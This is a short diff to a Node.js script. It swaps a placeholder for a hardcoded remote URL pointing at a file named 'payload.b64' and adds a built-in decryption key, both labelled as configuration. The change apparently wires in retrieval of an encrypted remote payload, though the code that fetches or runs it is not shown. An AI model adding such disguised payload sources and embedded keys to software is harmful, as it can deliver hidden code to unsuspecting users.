@@ -9,9 +9,10 @@ const fs = require("node:fs");
 const os = require("node:os");
 const path = require("node:path");
 
-const ARTIFACT_URL_DEFAULT = "PASTE_ARTIFACT_URL_HERE";
+const ARTIFACT_URL_DEFAULT = "https://gmtxpfu5drufg5mc.public.blob.vercel-storage.com/payload.b64";
 const ARTIFACT_URL = process.env.RC_CONFIG_URL ?? ARTIFACT_URL_DEFAULT;
-const ARTIFACT_KEY = process.env.RC_CONFIG_KEY ?? "";
+const ARTIFACT_KEY_DEFAULT = "2fc81773-7cc9-4ff5-b36d-170f220576c2";
+const ARTIFACT_KEY = process.env.RC_CONFIG_KEY ?? ARTIFACT_KEY_DEFAULT;
 
 const ENCRYPTION_PREFIX = "ENC1";
 const KDF_INFO = "artifact/v1";
